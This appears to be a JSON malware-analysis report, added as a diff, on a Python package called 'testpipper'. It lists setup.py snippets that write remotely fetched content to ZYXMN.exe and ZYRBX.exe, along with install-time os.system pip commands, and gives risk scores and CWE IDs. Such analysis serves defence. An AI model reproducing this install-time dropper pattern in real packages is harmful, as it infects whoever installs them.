@@ -1,0 +1,53 @@
+{
+  "package_metadata": {
+    "name": "testpipper",
+    "version": "0.0.1",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [
+      "setup.py:67 - Writing remote binary to ZYXMN.exe",
+      "setup.py:69 - Writing remote binary to ZYRBX.exe"
+    ],
+    "network_endpoints": [],
+    "process_spawns": [
+      "setup.py:31 - Executing OS command: pip install requests",
+      "setup.py:36 - Executing OS command: pip install subprocess",
+      "setup.py:41 - Executing OS command: pip install urllib.request"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "open('ZYXMN.exe', 'wb').write(r.content)"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "open('ZYRBX.exe', 'wb').write(r2.content)"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "os.system(\"pip install requests\")"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "os.system(\"pip install subprocess\")"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "os.system(\"pip install urllib.request\")"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
